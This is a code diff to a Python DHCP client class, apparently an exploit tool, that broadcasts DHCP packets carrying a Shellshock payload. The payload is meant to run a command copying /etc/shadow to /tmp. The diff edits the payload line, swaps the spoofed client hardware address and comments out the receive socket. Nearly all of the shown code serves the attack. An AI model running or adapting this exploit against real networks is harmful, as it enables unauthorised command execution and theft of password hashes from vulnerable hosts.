@@ -20,7 +20,7 @@ class Client:
         print(self.ip)
         self.port = 67
 
-        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls" % (self.ip, self.port)
+        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls"# % (self.ip, self.port)
         self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
         print(self.exploit)
         print(len(self.exploit))
@@ -43,7 +43,7 @@ class Client:
         siaddr = [b'\x00']*4  # Server ip address
 
         giaddr = [b'\x00']*4  # first relay agent ip address
-        chaddr = [b'\x00', b'\x1b', b'\x52', b'\x01', b'\xfc', b'\x42']  # client hardware address
+        chaddr = [b'\x08', b'\x00', b'\x27', b'\x94', b'\xf3', b'\x82']  # client hardware address
         chaddr_padding = [b'\x00']*(16-len(chaddr))
         sname = [b'\x00']*64  # server host name
         file = [b'\x00']*128  # bootfile name, routing information defined by server to the client
@@ -89,8 +89,8 @@ class Client:
         return return_packet
 
     def start_sockets(self):
-        self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.recv_socket.bind(('', self.port))
+        # self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # self.recv_socket.bind(('', self.port))
 
         self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
@@ -98,8 +98,8 @@ class Client:
     def start(self):
         self.dhcp_socket.sendto(self.dhcp_packet, ('255.255.255.255', 67))
 
-        data = self.recv_socket.recv(10000)
-        print(data)
+        # data = self.recv_socket.recv(10000)
+        # print(data)
         # while True:
         #     r, w, x = select.select([self.recv_socket, []], [], [])
         #     for each in r:
